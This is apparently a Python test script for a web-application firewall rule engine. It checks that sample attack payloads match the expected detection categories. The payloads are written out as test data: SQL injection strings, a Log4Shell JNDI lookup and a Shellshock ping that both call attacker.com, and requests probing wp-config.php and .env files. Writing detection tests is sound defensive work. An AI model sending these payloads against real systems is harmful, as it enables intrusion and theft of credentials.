import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src.engine.rule_engine import RuleEngine

def run_tests():
    print("Initializing RuleEngine with 2,000 rules...")
    engine = RuleEngine()
    engine._load_rules(force_refresh=True)
    total_rules = len(engine.default_rules)
    print(f"Engine successfully loaded {total_rules} rules into database.")
    
    test_cases = [
        ("UNION SELECT username, password FROM users", "SQL Injection"),
        ("' OR 1=1 --", "SQL Injection"),
        ("${jndi:ldap://attacker.com/a}", "CMS Vulnerabilities"),
        ("() { :; }; ping -c 3 attacker.com", "RCE & WebShells"),
        ('O:8:"Database":1:{s:4:"host";s:9:"localhost";}', "RCE & WebShells"),
        ("GET /wp-config.php HTTP/1.1", "CMS Vulnerabilities"),
        ("GET /.env HTTP/1.1", "CMS Vulnerabilities"),
        ("Transfer-Encoding: chunked", "SSRF & XXE"),
        ("sqlmap/1.8.2#stable (http://sqlmap.org)", "Bots & Scanners"),
    ]
    
    success = True
    for payload, expected_category in test_cases:
        request_data = {
            "url": "/api/test",
            "body": payload,
            "user_agent": payload
        }
        matches = engine.check_rules(request_data)
        matched_categories = [m.get("category") for m in matches]
        matched_names = [m["rule_name"] for m in matches]
        print(f"\nPayload: {payload[:50]}...")
        print(f"Matched ({len(matches)} rules): {matched_names[:2]} ...")
        
        if not matches or (expected_category and expected_category not in matched_categories):
            print(f"[-] FAILED: Expected category '{expected_category}' was not found in: {matched_categories}")
            success = False
        else:
            print(f"[+] PASSED (Matched in: {expected_category})")
            
    print("\n" + "="*50)
    if success and total_rules >= 2000:
        print(f"ALL 2,000 RULES VALIDATED AND PASSED SUCCESSFULLY!")
    else:
        print(f"TESTS COMPLETED with total rules: {total_rules}")

if __name__ == "__main__":
    run_tests()
